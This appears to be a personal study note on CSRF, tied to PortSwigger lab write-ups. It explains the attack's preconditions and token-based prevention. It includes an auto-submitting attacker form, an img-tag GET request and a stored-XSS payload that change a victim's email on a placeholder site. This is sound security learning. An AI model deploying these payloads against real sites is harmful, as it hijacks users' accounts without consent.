# What is CSRF ? 
It's a web security vulnerability that allows attacker to make users perform actions unintentionally.

# 3 Must Have for CSRF
1. **A proper action that is special to user** (email change, password change, username change ...)
2. **Cookie based session management.** (CSRF exists because browser put cookies automatically. If we don't have any cookie, then we can't talk about CSRF)
3. **No unpredictable tokens or parameters** (This is why CSRF Token is being used to prevent CSRF, if there is a parameter that you can't predict to make the functionality work, then you can't craft a malicious website that'd perform CSRF)

### Same Origin Policy
![[Pasted image 20220711093654.png]]

In order to have a better understanding of CSRF, let's give an example:

This is the user's request in order to change email.
```HTTP
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 

email=wiener@normal-user.com
```

And this is the attacker's website:
```HTML
<html> 
	<body> 
		<form action="https://vulnerable-website.com/email/change" method="POST"> 
			<input type="hidden" name="email" value="pwned@evil-user.net" />
		</form> 
			<script> document.forms[0].submit(); </script> 
	</body> 
</html>
```

Whenever user visits attacker's webpage browser will make a POST request to email change endpoint with given parameter value. Since protocol, domain name and endpoint is valid, browser'll put Cookie value in request **(assuming SameSate is not used)**. And attacker will change email of victim. 

Btw, if you need to make a GET request, then you can use **img** tag. Note that code below, does make a GET request however it also redirects you to google.com. 
```html
<html>
    <body>
        <form action="https://www.google.com" method="get">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

So if you just make a GET request in background, use following code:
```html
<html>
    <body>
        <img src="http://<source-you-wanna-make-get-request>" onerror="alert(`request have been made`)">

    </body>
</html>```

# Lab: CSRF vulnerability with no defenses
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-1-b3a484dd5372)

---
# XSS and CSRF
We can combine CSRF with XSS, so we don't need to redirect users to external sources. Let's say webpage is vulnerable to **Stored XSS**. Then attacker can place following XSS payload into vulnerable section and wait for users to visit that page.

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

This XSS will change the victim's email as `pwned@evil-user.net`. 

However it's important to note that if we're talking about **reflected XSS** and if **CSRF Token** is being used properly. Then we can't do the same thing that we've done in stored XSS part since we can't predict CSRF Token.

# Preventing CSRF
The best way to prevent CSRF is using a CSRF Token. CSRF Token must be:
* **Unpredictable**
* **Tied with Session**
* **And validated before every user action**

# Lab: CSRF where token validation depends on request method
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-2-52d6b1433c3f)

---
# Lab: CSRF where token validation depends on token being present
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-3-798b1524c449)

---
# Lab: CSRF where token is not tied to user session
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-4-5e7cb526d791)

---
# Lab: CSRF where token is tied to non-session cookie
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-5-b3482e160a8b)

---
# Lab: CSRF where token is duplicated in cookie
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-6-794d867a5ff4)

---
# Lab: CSRF where Referer validation depends on header being present
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-7-a90f9ad29ecd)

---
# Lab: CSRF with broken Referer validation
[Write-Up](https://medium.com/@booruledie/portswigger-labs-csrf-8-4865a07b4c33)

# Mindmap
![[CSRF 1.png]]